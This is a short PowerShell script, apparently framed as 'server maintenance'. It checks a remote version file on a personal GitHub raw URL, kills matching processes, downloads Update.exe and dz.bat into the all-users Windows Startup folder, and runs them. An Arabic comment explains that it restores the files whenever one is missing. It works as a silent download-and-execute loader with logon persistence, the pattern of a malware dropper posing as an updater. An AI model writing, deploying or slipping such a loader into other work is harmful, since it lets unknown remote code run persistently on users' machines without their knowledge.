$repo    = "https://raw.githubusercontent.com/zizomail1015-collab/server-maintenance/main"
$work    = "C:\ServerMaintenance"
$dest    = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
$files   = @("Update.exe", "dz.bat")

if (-not (Test-Path $work)) { New-Item -ItemType Directory -Path $work | Out-Null }
$verFile = Join-Path $work "version.local"

try {
    $remote = (Invoke-WebRequest -Uri "$repo/version.txt" -UseBasicParsing).Content.Trim()
} catch {
    exit
}

$local = ""
if (Test-Path $verFile) { $local = (Get-Content $verFile -Raw).Trim() }

# --- الاسترجاع: يخرج فقط إذا كان الإصدار نفسه والملفان موجودان. لو نقص ملف، يكمل وينزّله ---
$missing = $false
foreach ($f in $files) { if (-not (Test-Path (Join-Path $dest $f))) { $missing = $true } }
if (-not $missing -and $remote -eq $local) { exit }

foreach ($f in $files) {
    $name = [IO.Path]::GetFileNameWithoutExtension($f)
    Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 2

foreach ($f in $files) {
    try {
        Invoke-WebRequest -Uri "$repo/$f" -OutFile (Join-Path $dest $f) -UseBasicParsing
    } catch {
        exit
    }
}

Set-Content -Path $verFile -Value $remote

foreach ($f in $files) {
    Start-Process -FilePath (Join-Path $dest $f) -WorkingDirectory $dest
}
